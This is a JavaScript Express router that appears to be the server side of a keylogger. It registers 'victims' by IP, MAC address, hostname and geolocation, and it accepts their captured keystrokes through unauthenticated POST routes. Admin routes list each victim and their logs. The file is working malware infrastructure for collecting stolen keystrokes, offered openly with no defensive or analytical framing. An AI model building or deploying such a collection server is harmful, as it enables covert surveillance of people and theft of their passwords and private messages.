var path = require('path');
var express = require('express');
var router = express.Router();
var request = require('request');

const config = require('../config');

// set up database
const Sequelize = require('sequelize');

const sequelize = new Sequelize(config.db.database, config.db.username, config.db.password, {
  host: config.db.host,
  dialect: config.db.dialect,
  storage: config.db.sqliteFile
});

const Victim = sequelize.import(path.join(__dirname, '../models/victim'));
const Log = sequelize.import(path.join(__dirname, '../models/log'));
Victim.Logs = Victim.hasMany(Log);

sequelize.sync()
.then(()=> {
  console.log("Set up database successfully");
})


/**
 * @apiDefine Auth Authentication is needed for this API
 * Specify API keys in config.js file. Call the API either with the 'X-API-KEY' header,
 * 'apikey' in the querystring or 'apikey' in body (POST).
 * 
 * @apiParam {String} apikey Mandatory, but only once; either this or by using headers
 * @apiHeader {String} X-API-KEY Mandatory, but only once; either this or by using querystring
 * @apiError Unauthorized
 */
router.use('/victims', (req, res, next) => {
    // grab api key from various request methods
    var apikey = req.header('X-API-KEY') || req.query.apikey || req.body.apikey;

    if(req.method == "GET" && config.api.keys.indexOf(apikey) == -1){
      res.status(403).json({error: "unauthorized"})
    } else{
      next();
    }
  });

/**
 * @api {get} /api/victims Request listing of vicitms
 * @apiName GetAllVictims
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiSuccess {Array} victims victims which are already tracked
 */
router.get('/victims', (req, res, next) => {
  Victim.all()
    .then(victims => {
        res.json(victims);
    });
});

/**
 * @api {get} /api/victims/:id Request attributes from specific victim
 * @apiName GetVictim
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiParam {Number} id Victims unique id
 * @apiSuccess {Victim} victim single victim which is already tracked
 */
router.get('/victims/:id', (req, res) => {
  Victim.findById(req.params.id).then(victim => {
    if(victim == null)
      res.status(404).json({error: "not found"});
    else
      res.json(victim);
  });
});

/**
 * @api {get} /api/victims/:id Request attributes from specific victim
 * @apiName GetVictim
 * @apiGroup Victims
 * 
 * @apiUse Auth
 * @apiPermission Admin
 * 
 * @apiParam {Number} id Victims unique id
 * @apiSuccess {Victim} victim single victim which is already tracked
 */
router.get('/victims/:id/logs', (req, res) => {
  Victim.findById(req.params.id).then(victim => {
    if(victim == null)
      res.json({error: "not found"});
    else
      victim.getLogs().then(associatedLogs =>{
        res.json(associatedLogs);
      });
  });
});

/**
 * @api {post} /api/victims Create the victim to log
 * @apiName CreateVictim
 * @apiGroup Log
 * 
 * @apiPermission None
 * 
 * @apiParam {String} MACAddress Victims MAC
 * @apiParam {String} UUID
 * @apiParam {String} Hostname
 * @apiSuccess {Object} Victim Returns victim object with all attributes
 */
router.post('/victims', (req, res) => {
  var ip = req.headers['X-Real-IP'] || req.connection.remoteAddress;
  var useragent = req.headers['user-agent'];
  
  request.get('http://ip-api.com/json/' + ip, (error, response, body) => {
    if (!error && response.statusCode == 200) {
      var ipInfo = JSON.parse(body);

      if(ipInfo.status == 'fail')
        res.status(400).json({ error: ipInfo.message })
      else {
        Victim.create({
          ip: ip,
          country: ipInfo.country,
          region: ipInfo.regionName,
          city: ipInfo.city,
          macAddress: req.body.macAddress,
          useragent: req.headers['user-agent'],
          uuid: req.body.uuid,
          hostname: req.body.hostname
        }).then((victim) => {
          victim.reload().then((reloadedModel) => {
            res.json(reloadedModel);
          })
        })
      }
    }
  })
});

/**
 * @api {post} /api/victims/:id/logs Create logs for specific victim
 * @apiName CreateLog
 * @apiGroup Log
 * 
 * @apiPermission None
 * 
 * @apiParam {String} keystrokes Keystrokes to add in database
 * @apiSuccess {Object} message
 */
router.post('/victims/:id/logs', (req, res) => {
  console.log('smth: ', req.body, req.params.id)

  Log.create({
    victimId: req.params.id,
    keystrokes: req.body.keystrokes
  }).then(() => {
    res.status(200).json({message: "success"});
  }).catch((error) => {
    res.status(400).json({message: "failed"});
  })

});
module.exports = router;
